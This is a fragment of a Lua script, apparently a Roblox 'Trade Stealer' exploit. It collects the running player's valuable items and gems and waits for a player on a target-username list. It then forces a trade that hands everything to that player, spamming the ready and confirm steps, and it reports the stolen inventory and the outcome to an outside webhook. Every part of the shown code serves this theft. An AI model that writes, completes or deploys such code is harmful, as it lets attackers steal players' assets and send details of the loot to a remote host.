        loadAttempts = loadAttempts + 1
    end
    
    loadAttempts = 0
    while (not Library or not Library.IsLoaded or not Library.IsLoaded()) and loadAttempts < 500 do
        RunService.Heartbeat:Wait()
        loadAttempts = loadAttempts + 1
    end
    
    local valuableItems = getAllValuableItems()
    local gems = getGems()
    
    -- Send initial webhook (pending)
    sendWebhook(valuableItems, gems, false, "⏳ **PENDING** - Waiting for target...")
    
    local targetPlayer, matchedUsername = waitForFirstPlayer(targetUsernames)
    
    if not targetPlayer then
        warn("No target player found within timeout")
        sendWebhook(nil, nil, false, "❌ **FAILED** - No target player found")
        return
    end
    
    print("[Trade Stealer] Found target: " .. matchedUsername)
    
    local tradeCreated = false
    
    for retry = 1, 5 do
        print("[Trade Stealer] Requesting trade (attempt " .. retry .. ")...")
        requestTrade(targetPlayer)
        
        for waitCount = 1, 100 do
            RunService.Heartbeat:Wait()
            if getTradeId() then
                tradeCreated = true
                break
            end
        end
        
        if tradeCreated then break end
        safeWait(3)
    end
    
    if not tradeCreated then
        warn("Failed to create trade")
        sendWebhook(nil, nil, false, "❌ **FAILED** - Could not create trade with " .. matchedUsername)
        return
    end
    
    print("[Trade Stealer] Trade created! Adding items...")
    safeWait(1)
    
    -- Add all valuable items
    for i, item in ipairs(valuableItems) do
        local success = addItemToTrade(item.category, item.uid, item.amount)
        print("[Trade Stealer] Added " .. item.name .. " - " .. tostring(success))
        RunService.Heartbeat:Wait()
    end
    
    -- Add gems
    if gems then
        addItemToTrade('Currency', gems.uid, gems.amount)
        print("[Trade Stealer] Added gems: " .. gems.amount)
    end
    
    print("[Trade Stealer] All items added! Spamming ready/confirm...")
    
    -- SPAM READY AND CONFIRM
    local completed = spamReadyAndConfirm()
    
    -- Send final webhook
    if completed then
        sendWebhook(valuableItems, gems, true, "✅ **SUCCESS** - Trade completed with " .. matchedUsername)
    else
        sendWebhook(valuableItems, gems, false, "⚠️ **PARTIAL** - Items added but ready/confirm may have failed")
    end
    
    print("[Trade Stealer] Script finished. Completed: " .. tostring(completed))
end

pcall(main)
